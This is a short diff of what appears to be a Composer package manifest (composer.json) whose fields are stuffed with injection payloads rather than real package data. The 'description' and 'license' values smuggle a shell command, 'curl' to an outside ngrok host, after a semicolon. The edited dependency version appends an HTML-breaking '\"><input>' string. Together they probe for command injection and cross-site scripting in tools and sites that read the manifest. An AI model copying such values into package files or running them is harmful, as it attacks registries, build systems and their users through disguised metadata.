@@ -3,7 +3,7 @@
   "description": "sven/;curl -l -k 7baf-212-112-155-18.ngrok-free.app;#",
   "type": "bier",
   "require": {
-      "hellogerard/jobby": "dev-master"
+      "hellogerard/jobby": "dev-master\"><input>"
   },
   "license": "sven/;curl -l -k 7baf-212-112-155-18.ngrok-free.app;#",
   "autoload": {
